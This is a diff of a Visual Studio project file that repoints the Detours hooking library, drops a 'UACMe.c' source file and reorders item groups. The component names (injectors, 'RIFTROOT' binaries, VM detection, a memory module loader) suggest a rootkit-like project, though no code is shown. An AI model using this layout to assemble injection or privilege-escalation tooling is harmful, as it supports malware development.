@@ -99,7 +99,7 @@
     </ResourceCompile>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClInclude Include="..\Detours-4.0.1\include\detours.h" />
+    <ClInclude Include="..\msDetours\include\detours.h" />
     <ClInclude Include="MemoryModule.h" />
     <ClInclude Include="pch.h" />
     <ClInclude Include="resource.h" />
@@ -125,7 +125,6 @@
     <ClCompile Include="main.c" />
     <ClCompile Include="Process.c" />
     <ClCompile Include="Random.c" />
-    <ClCompile Include="UACMe.c" />
     <ClCompile Include="Crypt.c" />
     <ClCompile Include="Utils.c" />
     <ClCompile Include="VMDetect.c" />
@@ -139,14 +138,14 @@
     <Image Include="..\_riftIcon\_rift.ico" />
   </ItemGroup>
   <ItemGroup>
-    <Library Include="..\Detours-4.0.1\lib.X86\detours.lib" />
-  </ItemGroup>
-  <ItemGroup>
     <None Include="..\out\RIFTDLL" />
     <None Include="..\out\RIFTINJECT32" />
     <None Include="..\out\RIFTINJECT64" />
     <None Include="..\out\RIFTROOT32" />
     <None Include="..\out\RIFTROOT64" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="..\msDetours\lib.X86\detours.lib" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
